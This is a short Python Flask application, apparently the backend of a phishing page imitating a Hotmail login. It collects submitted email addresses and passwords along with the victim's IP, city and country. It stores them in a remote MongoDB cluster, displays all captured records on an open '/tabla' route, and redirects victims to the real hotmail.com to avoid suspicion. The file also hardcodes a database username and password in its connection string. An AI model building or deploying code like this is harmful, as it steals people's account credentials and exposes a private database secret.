from flask import Flask, render_template, request, redirect, url_for

from pymongo import MongoClient

uri = "mongodb+srv://torresyuliana382:ZFAsVwH2gAIEm1ic@cluster0.ndoznk5.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

# Crear un cliente y conectarse al servidor
client = MongoClient(uri)

# Seleccionar la base de datos y la colección
db = client['correos']
collection = db['mi_coleccion']

app = Flask(__name__)


@app.route('/')
def index():
    return render_template('correo.html')

@app.route('/submit', methods=['POST'])
def submit():
    # Obtener los datos del formulario
    input1 = request.form['input1']
    input2 = request.form['input2']
    ip = request.form['ip']
    ciudad =request.form['ciudad']
    pais = request.form['pais']
    # Obtener la IP del usuario
    documento = {
        "correo": input1,
        "contra": input2,
        "ciudad": ciudad,
        "pais": pais,
        "ip": ip
    }
    collection.insert_one(documento)

    # Redirigir a la página principal
   
    return redirect(url_for('success'))
@app.route('/tabla')
def tabla():
    # Obtener todos los documentos de la colección
    documentos = collection.find()
    return render_template('tabla.html', documentos=documentos)




@app.route('/ver_txt')
def ver_txt():
    # Leer el contenido del archivo de texto
    with open('data.txt', 'r') as file:
        contenido = file.read()

    # Mostrar el contenido en una página web
    return f'<pre>{contenido}</pre>'

@app.route('/success')
def success():
    return redirect('https://hotmail.com')

if __name__ == '__main__':
    app.run(debug=True)

